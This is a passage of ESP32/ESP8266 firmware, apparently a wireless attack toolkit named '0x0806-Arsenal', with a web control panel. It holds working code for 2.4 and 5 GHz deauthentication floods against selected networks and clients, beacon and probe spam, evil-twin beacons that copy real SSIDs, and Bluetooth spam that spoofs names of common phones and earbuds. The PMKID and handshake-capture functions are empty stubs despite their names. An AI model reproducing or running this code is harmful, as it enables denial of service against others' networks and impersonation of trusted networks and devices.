    response = "{\"networks\":" + String(networkCount) + ",\"stations\":" + String(stationCount) + ",\"packetRate\":" + String(packetsPerSecond) + ",\"totalPackets\":" + String(totalPackets) + "}";
    server.send(200, "application/json", response);
    return;
  }

  server.send(200, "text/plain", response);
}

void scanNetworks() {
  Serial.println("Scanning networks...");
  networkCount = 0;
  selectedNetworks = 0;

  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks(false, true);

  for (int i = 0; i < n && networkCount < MAX_NETWORKS; i++) {
    if (WiFi.SSID(i).length() > 0) {
      networks[networkCount].ssid = WiFi.SSID(i);
      networks[networkCount].bssid = WiFi.BSSIDstr(i);
      networks[networkCount].channel = WiFi.channel(i);
      networks[networkCount].rssi = WiFi.RSSI(i);
#ifdef ESP32
      networks[networkCount].encrypted = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
#else
      networks[networkCount].encrypted = WiFi.encryptionType(i) != ENC_TYPE_NONE;
#endif
      networks[networkCount].selected = false;
      networks[networkCount].is5GHz = (WiFi.channel(i) > 14);
      networkCount++;
    }
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);

  Serial.println("Network scan complete: " + String(networkCount) + " networks found");
}

void scanStations() {
  Serial.println("Scanning stations...");
  stationCount = 0;
  selectedStations = 0;

#ifdef ESP32
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
#else
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(promiscuousCallback);
#endif

  delay(10000); // Scan for 10 seconds

#ifdef ESP32
  esp_wifi_set_promiscuous(false);
#else
  wifi_promiscuous_enable(0);
#endif

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);

  Serial.println("Station scan complete: " + String(stationCount) + " stations found");
}

void startAttack(AttackType type) {
  if (attackRunning) stopAttack();

  currentAttack = type;
  attackRunning = true;
  attackStartTime = millis();
  totalPackets = 0;
  lastPacketCount = 0;

  Serial.println("Starting attack type: " + String(type));

  // Configure for attacks
  if (randomizeChannel) {
    attackChannel = random(1, 15);
    attack5GHzChannel = random(36, 165);
  }

#ifdef ESP32
  if (type >= ATTACK_BLE_SPAM && type <= ATTACK_BLE_SPOOF) {
    if (!bleInitialized) initializeBLE();
  }
#endif
}

void stopAttack() {
  if (!attackRunning) return;

  attackRunning = false;
  currentAttack = ATTACK_NONE;

#ifdef ESP32
  esp_wifi_set_promiscuous(false);
  if (bleInitialized && pAdvertising) {
    pAdvertising->stop();
  }
#else
  wifi_promiscuous_enable(0);
#endif

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);

  Serial.println("Attack stopped");
}

void updateStats() {
  if (attackRunning) {
    packetsPerSecond = totalPackets - lastPacketCount;
    lastPacketCount = totalPackets;
  } else {
    packetsPerSecond = 0;
  }
}

void loadSettings() {
  attackChannel = EEPROM.read(0);
  if (attackChannel < 1 || attackChannel > 14) attackChannel = 6;

  randomizeChannel = EEPROM.read(1) == 1;
  beaconInterval = EEPROM.read(2) | (EEPROM.read(3) << 8);
  if (beaconInterval < 10 || beaconInterval > 1000) beaconInterval = 100;

  deauthInterval = EEPROM.read(4) | (EEPROM.read(5) << 8);
  if (deauthInterval < 10 || deauthInterval > 1000) deauthInterval = 20;

  dualBandMode = EEPROM.read(6) == 1;
  bleEnabled = EEPROM.read(7) == 1;

  attack5GHzChannel = EEPROM.read(8) | (EEPROM.read(9) << 8);
  if (attack5GHzChannel < 36 || attack5GHzChannel > 165) attack5GHzChannel = 36;
}

void saveSettingsFromWeb() {
  attackChannel = server.arg("channel24").toInt();
  attack5GHzChannel = server.arg("channel5").toInt();
  randomizeChannel = server.arg("randomize") == "true";
  beaconInterval = server.arg("beaconInterval").toInt();
  deauthInterval = server.arg("deauthInterval").toInt();
  dualBandMode = server.arg("dualBand") == "true";
  bleEnabled = server.arg("bleEnabled") == "true";

  // Save to EEPROM
  EEPROM.write(0, attackChannel);
  EEPROM.write(1, randomizeChannel ? 1 : 0);
  EEPROM.write(2, beaconInterval & 0xFF);
  EEPROM.write(3, (beaconInterval >> 8) & 0xFF);
  EEPROM.write(4, deauthInterval & 0xFF);
  EEPROM.write(5, (deauthInterval >> 8) & 0xFF);
  EEPROM.write(6, dualBandMode ? 1 : 0);
  EEPROM.write(7, bleEnabled ? 1 : 0);
  EEPROM.write(8, attack5GHzChannel & 0xFF);
  EEPROM.write(9, (attack5GHzChannel >> 8) & 0xFF);
  EEPROM.commit();
}

// ESP8266 Attack Handler
#ifndef ESP32
void handleAttackESP8266() {
  if (!attackRunning) return;

  switch (currentAttack) {
    case ATTACK_DEAUTH:
      performDeauth();
      break;
    case ATTACK_BEACON_SPAM:
      performBeaconSpam();
      break;
    case ATTACK_PROBE_SPAM:
      performProbeSpam();
      break;
    case ATTACK_KARMA:
      performKarma();
      break;
    case ATTACK_EVIL_TWIN:
      performEvilTwin();
      break;
    case ATTACK_PMKID:
      performPMKID();
      break;
    case ATTACK_HANDSHAKE:
      performHandshakeCapture();
      break;
    case ATTACK_MONITOR:
      performMonitor();
      break;
  }
}
#endif

// ESP32 Task Functions
#ifdef ESP32
void attackTaskCore(void* parameter) {
  while (true) {
    if (attackRunning) {
      switch (currentAttack) {
        case ATTACK_DEAUTH:
          performDeauth();
          break;
        case ATTACK_BEACON_SPAM:
          performBeaconSpam();
          break;
        case ATTACK_PROBE_SPAM:
          performProbeSpam();
          break;
        case ATTACK_KARMA:
          performKarma();
          break;
        case ATTACK_EVIL_TWIN:
          performEvilTwin();
          break;
        case ATTACK_PMKID:
          performPMKID();
          break;
        case ATTACK_HANDSHAKE:
          performHandshakeCapture();
          break;
        case ATTACK_MONITOR:
          performMonitor();
          break;
        case ATTACK_5GHZ_DEAUTH:
          perform5GHzDeauth();
          break;
        case ATTACK_DUAL_BAND:
          performDualBandAttack();
          break;
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

void monitorTaskCore(void* parameter) {
  while (true) {
    if (attackRunning && currentAttack == ATTACK_MONITOR) {
      // Monitor both bands
      if (dualBandMode) {
        // Switch between 2.4GHz and 5GHz
        static bool band24 = true;
        if (band24) {
          esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
        } else {
          esp_wifi_set_channel(attack5GHzChannel, WIFI_SECOND_CHAN_NONE);
        }
        band24 = !band24;
      }
    }
    vTaskDelay(pdMS_TO_TICKS(1000));
  }
}

void bleTaskCore(void* parameter) {
  while (true) {
    if (attackRunning && bleEnabled) {
      switch (currentAttack) {
        case ATTACK_BLE_SPAM:
          performBLESpam();
          break;
        case ATTACK_BLE_BEACON:
          performBLEBeacon();
          break;
        case ATTACK_BLE_SPOOF:
          performBLESpoof();
          break;
      }
    }
    vTaskDelay(pdMS_TO_TICKS(50));
  }
}

void initializeBLE() {
  if (bleInitialized) return;

  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  esp_bluedroid_init();
  esp_bluedroid_enable();

  BLEDevice::init("0x0806-Arsenal");
  pAdvertising = BLEDevice::getAdvertising();

  bleInitialized = true;
  Serial.println("BLE initialized");
}

void performBLESpam() {
  if (!bleInitialized) return;

  BLEAdvertisementData advData;
  String deviceName = "BLE-" + String(random(1000, 9999));
  advData.setName(deviceName);

  // Random manufacturer data
  uint8_t mfgData[20];
  for (int i = 0; i < 20; i++) {
    mfgData[i] = random(256);
  }
  std::string mfgString((char*)mfgData, 20);
  advData.setManufacturerData(mfgString);

  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  vTaskDelay(pdMS_TO_TICKS(100));
  pAdvertising->stop();

  blePackets++;
  totalPackets++;
}

void performBLEBeacon() {
  if (!bleInitialized) return;

  BLEAdvertisementData advData;

  // Create various beacon types
  static int beaconType = 0;
  switch (beaconType % 3) {
    case 0: // iBeacon
      {
        uint8_t iBeaconData[25] = {
          0x02, 0x01, 0x06, 0x1A, 0xFF, 0x4C, 0x00, 0x02, 0x15,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0xC5
        };
        for (int i = 9; i < 25; i++) iBeaconData[i] = random(256);
        std::string iBeaconString((char*)iBeaconData, 25);
        advData.setManufacturerData(iBeaconString);
      }
      break;
    case 1: // Eddystone
      advData.setName("Eddystone-" + String(random(100, 999)));
      break;
    case 2: // Custom
      advData.setName("Custom-Beacon-" + String(random(1000, 9999)));
      break;
  }

  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  vTaskDelay(pdMS_TO_TICKS(50));
  pAdvertising->stop();

  beaconType++;
  blePackets++;
  totalPackets++;
}

void performBLESpoof() {
  if (!bleInitialized) return;

  BLEAdvertisementData advData;

  // Spoof common device names
  String deviceNames[] = {
    "iPhone", "Samsung Galaxy", "AirPods Pro", "Apple Watch", 
    "Pixel Buds", "Surface Laptop", "MacBook Pro", "iPad",
    "Galaxy Watch", "Beats Studio", "JBL Speaker", "Bose QC"
  };

  String deviceName = deviceNames[random(12)] + "-" + String(random(100, 999));
  advData.setName(deviceName);

  // Add realistic service UUIDs
  BLEUUID serviceUUID = BLEUUID(random(0x1000, 0xFFFF));
  advData.setServiceUUID(serviceUUID);

  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  vTaskDelay(pdMS_TO_TICKS(200));
  pAdvertising->stop();

  blePackets++;
  totalPackets++;
}

void perform5GHzDeauth() {
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].selected && networks[i].is5GHz) {
      // Parse BSSID
      uint8_t bssid[6];
      sscanf(networks[i].bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

      // Set channel to 5GHz
      esp_wifi_set_channel(networks[i].channel, WIFI_SECOND_CHAN_NONE);

      // Update deauth packet
      memcpy(&deauthPacket[4], bssid, 6);
      memcpy(&deauthPacket[10], bssid, 6);
      memcpy(&deauthPacket[16], bssid, 6);

      // Send broadcast deauth
      memset(&deauthPacket[4], 0xFF, 6);
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);

      totalPackets++;
      wifiPackets++;
    }
  }
  vTaskDelay(pdMS_TO_TICKS(deauthInterval));
}

void performDualBandAttack() {
  static bool band24 = true;

  if (band24) {
    // 2.4GHz attack
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
    performDeauth();
  } else {
    // 5GHz attack
    esp_wifi_set_channel(attack5GHzChannel, WIFI_SECOND_CHAN_NONE);
    perform5GHzDeauth();
  }

  band24 = !band24;
}

void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (stationCount >= MAX_STATIONS) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* frame = pkt->payload;
  uint16_t frameLen = pkt->rx_ctrl.sig_len;

  if (frameLen < 24) return;

  uint8_t frameType = frame[0] & 0xFC;

  if (frameType == 0x08 || frameType == 0x40) {
    char macStr[18];
    sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
            frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);

    bool exists = false;
    for (int i = 0; i < stationCount; i++) {
      if (stations[i].mac == String(macStr)) {
        exists = true;
        break;
      }
    }

    if (!exists) {
      stations[stationCount].mac = String(macStr);
      sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
              frame[4], frame[5], frame[6], frame[7], frame[8], frame[9]);
      stations[stationCount].bssid = String(macStr);
      stations[stationCount].channel = pkt->rx_ctrl.channel;
      stations[stationCount].rssi = pkt->rx_ctrl.rssi;
      stations[stationCount].selected = false;
      stationCount++;
    }
  }
}

#else
// ESP8266 promiscuous callback
void promiscuousCallback(uint8_t* buf, uint16_t len) {
  if (stationCount >= MAX_STATIONS) return;

  uint8_t* frame = buf + 12;
  uint16_t frameLen = len - 12;

  if (frameLen < 24) return;

  uint8_t frameType = frame[0] & 0xFC;

  if (frameType == 0x08 || frameType == 0x40) {
    char macStr[18];
    sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
            frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);

    bool exists = false;
    for (int i = 0; i < stationCount; i++) {
      if (stations[i].mac == String(macStr)) {
        exists = true;
        break;
      }
    }

    if (!exists) {
      stations[stationCount].mac = String(macStr);
      sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
              frame[4], frame[5], frame[6], frame[7], frame[8], frame[9]);
      stations[stationCount].bssid = String(macStr);
      stations[stationCount].channel = wifi_get_channel();
      stations[stationCount].rssi = -50; // Approximation
      stations[stationCount].selected = false;
      stationCount++;
    }
  }
}
#endif

// Attack implementations
void performDeauth() {
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].selected && !networks[i].is5GHz) {
      uint8_t bssid[6];
      sscanf(networks[i].bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

#ifdef ESP32
      esp_wifi_set_channel(networks[i].channel, WIFI_SECOND_CHAN_NONE);
#else
      wifi_set_channel(networks[i].channel);
#endif

      memcpy(&deauthPacket[4], bssid, 6);
      memcpy(&deauthPacket[10], bssid, 6);
      memcpy(&deauthPacket[16], bssid, 6);

      memset(&deauthPacket[4], 0xFF, 6);

#ifdef ESP32
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
#else
      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
#endif

      totalPackets++;
      wifiPackets++;

      for (int j = 0; j < stationCount; j++) {
        if (stations[j].selected && stations[j].bssid == networks[i].bssid) {
          uint8_t staMac[6];
          sscanf(stations[j].mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                 &staMac[0], &staMac[1], &staMac[2], &staMac[3], &staMac[4], &staMac[5]);

          memcpy(&deauthPacket[4], staMac, 6);

#ifdef ESP32
          esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
#else
          wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
#endif

          totalPackets++;
          wifiPackets++;
        }
      }
    }
  }

#ifdef ESP32
  vTaskDelay(pdMS_TO_TICKS(deauthInterval));
#else
  delay(deauthInterval);
#endif
}

void performBeaconSpam() {
  static int beaconCounter = 0;

  String fakeSSID = "0x0806-Fake-" + String(beaconCounter++);
  if (beaconCounter > 999) beaconCounter = 0;

  uint8_t fakeBSSID[6];
  for (int i = 0; i < 6; i++) {
    fakeBSSID[i] = random(256);
  }

  uint8_t beacon[256];
  memcpy(beacon, beaconPacket, 38);

  memcpy(&beacon[10], fakeBSSID, 6);
  memcpy(&beacon[16], fakeBSSID, 6);

  beacon[38] = 0x00;
  beacon[39] = fakeSSID.length();
  memcpy(&beacon[40], fakeSSID.c_str(), fakeSSID.length());

  int beaconLen = 40 + fakeSSID.length();

  if (randomizeChannel) {
    int ch = random(1, 15);
#ifdef ESP32
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
#else
    wifi_set_channel(ch);
#endif
  }

#ifdef ESP32
  esp_wifi_80211_tx(WIFI_IF_STA, beacon, beaconLen, false);
#else
  wifi_send_pkt_freedom(beacon, beaconLen, 0);
#endif

  totalPackets++;
  wifiPackets++;

#ifdef ESP32
  vTaskDelay(pdMS_TO_TICKS(beaconInterval));
#else
  delay(beaconInterval);
#endif
}

void performProbeSpam() {
  static int probeCounter = 0;

  String fakeSSID = "Probe-" + String(probeCounter++);
  if (probeCounter > 999) probeCounter = 0;

  uint8_t probe[256];
  memcpy(probe, beaconPacket, 24);
  probe[0] = 0x40;

  uint8_t fakeMac[6];
  for (int i = 0; i < 6; i++) {
    fakeMac[i] = random(256);
  }
  memcpy(&probe[10], fakeMac, 6);

  probe[24] = 0x00;
  probe[25] = fakeSSID.length();
  memcpy(&probe[26], fakeSSID.c_str(), fakeSSID.length());

  int probeLen = 26 + fakeSSID.length();

#ifdef ESP32
  esp_wifi_80211_tx(WIFI_IF_STA, probe, probeLen, false);
#else
  wifi_send_pkt_freedom(probe, probeLen, 0);
#endif

  totalPackets++;
  wifiPackets++;

#ifdef ESP32
  vTaskDelay(pdMS_TO_TICKS(50));
#else
  delay(50);
#endif
}

void performKarma() {
  performBeaconSpam();
}

void performEvilTwin() {
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].selected) {
      String ssid = networks[i].ssid;

      uint8_t fakeBSSID[6];
      for (int j = 0; j < 6; j++) {
        fakeBSSID[j] = random(256);
      }

      uint8_t beacon[256];
      memcpy(beacon, beaconPacket, 38);
      memcpy(&beacon[10], fakeBSSID, 6);
      memcpy(&beacon[16], fakeBSSID, 6);

      beacon[38] = 0x00;
      beacon[39] = ssid.length();
      memcpy(&beacon[40], ssid.c_str(), ssid.length());

      int beaconLen = 40 + ssid.length();

#ifdef ESP32
      esp_wifi_80211_tx(WIFI_IF_STA, beacon, beaconLen, false);
#else
      wifi_send_pkt_freedom(beacon, beaconLen, 0);
#endif

      totalPackets++;
      wifiPackets++;
    }
  }

#ifdef ESP32
  vTaskDelay(pdMS_TO_TICKS(beaconInterval));
#else
  delay(beaconInterval);
#endif
}

void performPMKID() {
  performMonitor();
}

void performHandshakeCapture() {
  performMonitor();
}

void performMonitor() {
  totalPackets++;
  wifiPackets++;

#ifdef ESP32
  vTaskDelay(pdMS_TO_TICKS(10));
#else
  delay(10);
#endif
}
